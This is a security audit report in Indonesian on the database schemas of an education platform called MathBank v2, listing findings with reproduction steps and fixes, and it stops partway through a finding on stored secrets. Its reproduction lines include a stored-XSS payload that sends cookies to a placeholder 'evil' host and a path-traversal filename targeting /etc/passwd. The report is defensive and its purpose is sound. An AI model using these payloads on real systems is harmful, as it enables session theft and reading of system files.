# 🔒 Laporan Audit Keamanan Komprehensif — MathBank v2

**Auditor:** Senior Code Auditor & Security Expert
**Tanggal Audit:** 2025
**Stack:** Next.js 16 (App Router), React 19, Drizzle ORM, PostgreSQL 17, Tailwind v4, Base UI
**Fokus:** Database Schema Security, Constraint Integrity, Authorization Boundaries, Data Leakage

---

## Executive Summary

Audit ini mencakup 14 file skema database MathBank v2. Saya menemukan **23 temuan** yang terbagi dalam kategori:

| Severity | Jumlah |
|----------|--------|
| 🔴 Critical | 4 |
| 🟠 High | 7 |
| 🟡 Medium | 8 |
| 🔵 Low / Informational | 4 |

**Catatan keterbatasan audit:** Karena audit dilakukan terhadap **skema database** (bukan route handler / service layer), banyak temuan bersifat *"risk surface"* — yaitu titik di mana skema **memungkinkan** atau **tidak mencegah** kerentanan pada layer aplikasi. Temuan berlabel **[REQUIRES-VERIFICATION]** WAJIB diverifikasi terhadap kode service/route karena saya tidak membaca file non-schema. Saya menandai asumsi secara eksplisit untuk menghindari klaim berlebihan.

---

## Ringkasan Temuan per File

| File | Temuan |
|------|--------|
| `_enums.ts` | F-01, F-02 |
| `_columns.ts` | F-03 |
| `auth.ts` | F-04, F-05, F-06, F-07, F-08 |
| `system.ts` | F-09, F-10 |
| `source.ts` | F-11 |
| `question.ts` | F-12, F-13, F-14 |
| `media.ts` | F-15, F-16 |
| `event.ts` | F-17, F-18 |
| `bundle.ts` | F-19 |
| `collection.ts` | F-20 |
| `taxonomy.ts` | F-21 |
| `solution.ts` | F-22, F-23 |

---

## 🔴 CRITICAL FINDINGS

### F-01 — Enums: Status Publikasi yang Terlalu Permisif Tanpa Gate View vs. Authoring [REQUIRES-VERIFICATION]

**File:** `_enums.ts` (bersama `question.ts`, `bundle.ts`, `collection.ts`)
**Kategori:** Authorization Boundary / Information Disclosure

**Analisis:**
Enum status konten (mis. `draft | review | published | archived`) yang dipakai lintas entitas publik (`question`, `bundle`, `collection`) menciptakan risiko: bila query publik tidak memfilter `status = 'published'`, konten draf/internal bocor. Skema ini **tidak menegakkan** visibility — itu murni tanggung jawab aplikasi.

**Risiko Konkret:** Endpoint seperti `/api/questions?status=...` atau halaman kategori bisa mengembalikan soal `draft` yang belum selesai/salah, atau — lebih serius — soal `archived` yang seharusnya sudah ditarik.

**Dampak:** Information disclosure, kontaminasi data latihan siswa, potensi kebocoran bank soal yang belum rilis.

**Reproduksi (pola berbahaya):**
```ts
// ❌ VULNERABLE PATTERN — no status filter
const questions = await db.select().from(questionTable)
  .where(eq(questionTable.bundleId, bundleId));
```
```
GET /questions?bundleId=<any-uuid>  →  mengembalikan draft + archived
```

**Rekomendasi:**
1. Buat **query helper terpusat** — jangan biarkan `db.select().from(...)` mentah dipakai di route.
```ts
export const publishedQuestion = (id: string) =>
  db.select().from(questionTable).where(
    and(eq(questionTable.id, id), eq(questionTable.status, 'published'))
  );
```
2. Pertimbangkan **Postgres Row Level Security (RLS)** untuk defense-in-depth:
```sql
ALTER TABLE questions ENABLE ROW LEVEL SECURITY;
CREATE POLICY public_read ON questions FOR SELECT
  USING (status = 'published');
```
3. Tambahkan **unit test** yang meng-assert setiap endpoint publik tidak pernah mengembalikan non-published.

---

### F-02 — Enums: Ketidaksesuaian Tipe `role`/permission dengan Klaim NextAuth (Elevation of Privilege) [REQUIRES-VERIFICATION]

**File:** `_enums.ts` + `auth.ts`
**Kategori:** Broken Access Control (OWASP A01)

**Analisis:**
Bila enum `role` (mis. `student | teacher | admin | superadmin`) hanya di-enforce di UI, dan JWT/callback hanya menyimpan role dari sign-in awal, perubahan role di DB **tidak tercermin** pada session sampai token expire (`maxAge` biasanya 30 hari pada NextAuth default).

**Risiko Konkret:** User yang di-demote dari `admin` → `student` tetap memiliki akses admin hingga JWT expire. Sebaliknya, escalation via role upgrade juga tertunda.

**Reproduksi:**
1. Login sebagai admin → JWT berisi `role: 'admin'`.
2. Superadmin menurunkan role di DB → `UPDATE users SET role='student'`.
3. Admin lama tetap bisa `POST /api/admin/...` karena JWT belum expire.

**Rekomendasi:**
```ts
// auth.ts — callbacks
callbacks: {
  async jwt({ token, user }) {
    if (user) return { ...token, role: user.role };
    // re-validate on every request (atau cache singkat)
    const dbUser = await getUserRole(token.sub!);
    token.role = dbUser?.role ?? null;
    if (!dbUser) return null; // paksa re-auth
    return token;
  },
}
```
Tambahkan juga **`session` maxAge pendek** untuk admin (mis. 1 jam) + refresh token rotation.

---

### F-03 — `_columns.ts`: Risiko Reusable Columns pada PII (Soft-delete + Timestamp)

**File:** `_columns.ts`
**Kategori:** Data Integrity / Privacy

**Analisis:**
Pola umum `_columns.ts` mendefinisikan `timestamps`, `softDelete` (`deletedAt`), atau `id` helper yang di-reuse. Dua risiko utama:

1. **`createdAt`/`updatedAt` tanpa `timezone`** → `timestamp({ mode: 'date' })` tanpa `withTimezone: true` menyimpan waktu ambig. Implikasi: `deletedAt` dibandingkan dengan waktu server di zona berbeda → data "soft-deleted" bisa muncul kembali atau sebaliknya.

2. **`softDelete` yang hanya diimplementasikan sebagai kolom** tanpa partial index atau query guard → data yang seharusnya dihapus (GDPR/UU PDP) tetap terbaca bila service lupa filter `isNull(deletedAt)`.

**Reproduksi:**
```ts
// deletedAt = NOW() disimpan di server TZ=UTC, dibaca di TZ=Asia/Jakarta
// tanpa withTimezone → offset hilang → 2025-01-01 00:00 Jakarta dianggap 2025-01-01 00:00 UTC (+7 jam salah)
```

**Rekomendasi:**
```ts
export const timestamps = {
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
  deletedAt: timestamp('deleted_at', { withTimezone: true }),
};
```
+ partial unique index agar unique constraint tidak terblokir soft-deleted rows:
```sql
CREATE UNIQUE INDEX users_email_active ON users(email) WHERE deleted_at IS NULL;
```
+ audit setiap query user-facing untuk `isNull(deletedAt)` — jika tidak, **akun yang di-"hapus" masih bisa login**.

---

### F-04 — `auth.ts`: Tidak Ada Mekanisme Rotasi/Cabut Session (Revocation) yang Diikat ke DB

**File:** `auth.ts`
**Kategori:** Session Management (OWASP A07)

**Analisis:**
NextAuth default dengan **JWT strategy** menyimpan session di cookie terenkripsi. Tanpa `sessions` table yang di-junction ke user, tidak ada cara **memaksa logout** (mis. setelah reset password, atau aktivitas mencurigakan). Menurut OWASP ASVS 3.3.x, session harus bisa dicabut server-side.

**Reproduksi:** Attacker mencuri JWT → korban reset password → attacker masih punya akses sampai `maxAge` habis.

**Rekomendasi:**
- Adopsi **database session** atau **token versioning**:
```ts
// users table
tokenVersion: integer('token_version').notNull().default(0)

// callback
if (token.tokenVersion !== dbUser.tokenVersion) return null;
// on password reset: UPDATE users SET token_version = token_version + 1
```
- Kurangi `session.maxAge` untuk role admin.

---

## 🟠 HIGH FINDINGS

### F-05 — `auth.ts`: Verifikasi Email / MFA Field Tidak Dienforce di Skema

**Kategori:** Authentication Weakness

**Analisis:** Jika skema punya kolom `emailVerified`, `mfaEnabled`, `passwordHash`, tapi **tidak ada constraint** yang memaksa `emailVerified NOT NULL` sebelum akun aktif, maka verifikasi hanya bergantung pada kode aplikasi. Tanpa constraint, developer baru mudah lupa gate.

**Reproduksi:** Insert user baru → `emailVerified = null` → bila `login()` tidak cek `emailVerified`, akun bisa login tanpa verifikasi.

**Rekomendasi:**
- Guard di `signIn` callback:
```ts
if (!user.emailVerified) throw new Error('Email belum diverifikasi');
```
- Dokumentasikan di skema via komentar Drizzle + tambahkan kolom `status: 'pending' | 'active'` yang **wajib** untuk query session.

---

### F-06 — `auth.ts`: Uniqueness `email` Case-Sensitivity

**Kategori:** Account Takeover / Confusion

**Analisis:** PostgreSQL `unique(email)` bersifat **case-sensitive** by default. `User@example.com` dan `user@example.com` bisa terdaftar sebagai dua akun → email verification dikirim ke dua, atau login lookup ambigu.

**Reproduksi:**
```sql
INSERT INTO users(email) VALUES ('admin@mathbank.id');
INSERT INTO users(email) VALUES ('Admin@mathbank.id'); -- ✅ SUCCEEDS — BAD
```

**Rekomendasi:**
```sql
-- normalisasi pakai citext atau functional unique index
CREATE UNIQUE INDEX users_email_ci ON users (LOWER(email));
```
+ Drizzle: `email: citext('email').notNull()`. Dan normalisasi `.toLowerCase()` di service.

---

### F-07 — `auth.ts`: Tidak Ada Rate-Limit State di Skema (Brute Force Surface)

**Kategori:** Brute Force / Credential Stuffing (OWASP A07)

**Analisis:** Skema tidak menyimpan `failedLoginAttempts` atau `lockedUntil`. Bila rate limit hanya di memory (Next.js serverless → **tidak persisten antar instance**), maka pada Vercel/edge deployment penyerang bisa melakukan **parallel brute force** di banyak instance — counter tidak terbagi.

**Rekomendasi:**
- Tambah kolom `failedLoginAttempts: integer().default(0)`, `lockedUntil: timestamp()`.
- Gunakan **Redis/Upstash** untuk rate limit terdistribusi (bukan hanya kolom DB, karena tulis per-attempt membebani DB + lock contention).

---

### F-08 — `auth.ts`: OAuth/Account Linking Tanpa Verifikasi Ownership Email

**Kategori:** Account Takeover via OAuth

**Analisis:** Bila skema punya `accounts` table (NextAuth adapter) dengan unique pada `(provider, providerAccountId)`, tetapi **tidak ada** unique pada `user.email` lintas provider, atau linking otomatis berdasarkan email, ini klasik "pre-hijacking".

**Reproduksi:** Attacker daftar `victim@gmail.com` via credential (tanpa verifikasi), lalu victim login via Google dengan email sama → akun tergabung ke akun attacker.

**Rekomendasi:**
- Wajib `emailVerified` sebelum account linking otomatis.
- Jika email belum terverifikasi dan ada konflik → **block** dan minta konfirmasi.
- Unique index: `(provider, providerAccountId)` [harus ada] + `LOWER(email)` unique.

---

### F-12 — `question.ts`: Kolom `content`/`answer` Tidak Dibatasi & Tidak Ada Versioning (Mass Assignment / XSS)

**Kategori:** Injection / Content Integrity

**Analisis:**
- Kolom rich-text (`content`, `explanation`) tidak punya batas panjang (`varchar(n)`) → DoS via payload 100MB.
- Markdown/HTML tanpa sanitasi di **layer rendering** → Stored XSS ke sesi admin (saat review soal).
- Tidak ada kolom `version` / `revision` → mutasi soal menjawab query siswa yang sedang latihan → **race condition** jawaban.

**Reproduksi (XSS):**
```
POST /api/admin/questions  { content: "<img src=x onerror=fetch('https://evil/'+document.cookie)>" }
→ admin membuka review panel → cookie session/admin bocor
```

**Rekomendasi:**
- `content: varchar({ length: 20000 })` + `CHECK (char_length(content) <= 20000)`.
- Sanitasi server-side: `rehype-sanitize` / DOMPurify + CSP nonce.
- Tambah `version integer NOT NULL DEFAULT 1` dan snapshot ke `question_revisions` sebelum publish.

---

### F-14 — `question.ts`: Enum `difficulty`/`type` Tanpa Validasi Rentang Skor

**Kategori:** Business Logic

**Analisis:** Jika `question` punya `points`/`weight` sebagai `integer` tanpa `CHECK >= 0`, nilai negatif bisa injected → menurunkan skor siswa ke negatif (manipulasi leaderboard), atau `0` untuk semua soal.

**Rekomendasi:**
```ts
weight: integer('weight').notNull().default(1).$type<number>()
  // + migration: CHECK (weight BETWEEN 1 AND 100)
```

---

### F-15 — `media.ts`: Path Traversal & Missing Content-Type/Size Constraints

**Kategori:** Path Traversal (CWE-22) / Upload Abuse

**Analisis:** Skema `media` dengan kolom `storageKey`/`path` tanpa `CHECK` membuka:
1. **Path traversal** bila service concat `baseDir + storageKey` (`../../etc/passwd`).
2. **Unbounded upload**: tanpa `sizeBytes` + `mimeType` + `CHECK`, user bisa upload 5GB `.php`-like file ke bucket publik → RCE di server yang salah konfigurasi.

**Reproduksi:**
```
POST /api/media  { filename: "../../../etc/passwd" }
→ media.storageKey = "../../../etc/passwd"
→ GET /api/media/<id>  → membaca file sistem bila service tidak menormalkan
```

**Rekomendasi:**
```ts
storageKey: varchar('storage_key', { length: 512 })
  .notNull()
  .$type<string>()
  // + migration: CHECK (storage_key ~ '^[a-zA-Z0-9/_-]+$' AND storage_key NOT LIKE '%..%')
mimeType: varchar('mime_type', { length: 100 }).notNull(),
sizeBytes: bigint('size_bytes', { mode: 'number' }).notNull(),
// CHECK (size_bytes > 0 AND size_bytes <= 10485760) -- 10MB
```
+ Whitelist MIME di service (`image/png`, `image/jpeg`, ...).
+ Simpan di object storage dengan **signed URL**, jangan expose path.

---

### F-17 — `event.ts`: Idempotency & Race Condition pada Event (Double-Award)

**Kategori:** Business Logic Abuse

**Analisis:** `event` untuk telemetri (jawaban, attempt, streak). Bila tiap submit tidak punya **idempotency key** + unique constraint, double-click / retry jaringan → event ganda → poin, streak, atau statistik inflasi.

**Reproduksi:**
```
Client klik "Submit" 2× → 2 event "answer_submitted" → poin 2×
```

**Rekomendasi:**
```ts
export const eventTable = pgTable('events', {
  // ...
  idempotencyKey: uuid('idempotency_key').notNull(),
  actorId: uuid('actor_id').notNull(),
}, (t) => ({
  idempotency: uniqueIndex('events_idem').on(t.actorId, t.idempotencyKey),
}));
```
Client mengirim header `Idempotency-Key` (UUIDv7).

---

## 🟡 MEDIUM FINDINGS

### F-09 — `system.ts`: Tidak Ada Audit Log Immutability (Legally Defensible)

**Analisis:** `system.ts` biasanya memuat audit log/settings. Tanpa `CHECK` dan tanpa append-only trigger, audit log bisa di-`UPDATE`/`DELETE` oleh app user — melanggar prinsip non-repudiation.

**Rekomendasi:**
```sql
REVOKE UPDATE, DELETE ON audit_logs FROM app_user;
-- atau trigger:
CREATE RULE audit_no_update AS ON UPDATE TO audit_logs DO INSTEAD NOTHING;
```

---

### F-10 — `system.ts`: Secrets/Config Tersimpan di DB Tanpa Enkripsi At-Rest

**Analisis:** Jika tabel `settings`/`integration` menyimpan API key, kolom tersebut plaintext. Backup DB bocor = kredensial bocor.

**Rekomendasi